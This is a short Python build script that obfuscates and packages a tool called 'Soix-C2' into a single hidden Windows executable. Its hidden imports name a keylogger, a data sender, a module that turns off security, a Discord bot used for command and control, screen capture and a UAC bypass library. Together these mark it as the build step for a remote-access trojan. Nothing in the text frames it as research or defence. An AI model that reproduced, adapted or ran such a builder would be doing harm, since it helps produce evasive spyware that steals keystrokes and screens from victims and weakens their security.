import os

if not os.path.exists('../venv/'):
	os.system('python -m venv ../venv')
	os.system(r'cmd /c "..\venv\Scripts\activate.bat && python -m pip install -r requirements.txt"')

cmd_build = r'cmd /c "python ../BlankOBF.py -o ../soix_obf.py ../main.py && ..\venv\Scripts\activate.bat && pyinstaller --noconfirm --onefile --distpath=./dist/Soix-C2 --paths=../venv/Lib/site-packages --upx-dir=./upx --windowed --icon=NONE --name "Soix" --hidden-import=PIL --hidden-import=PIL.ImageGrab --hidden-import=discord_bot --hidden-import=discord_bot.bot --hidden-import=core --hidden-import=core.keylogger --hidden-import=core.sender --hidden-import=core.turn_off_security --hidden-import=winpwnage --hidden-import=winpwnage.functions.uac.uacMethod1.uacMethod1 ../soix_obf.py"'

os.system(cmd_build)
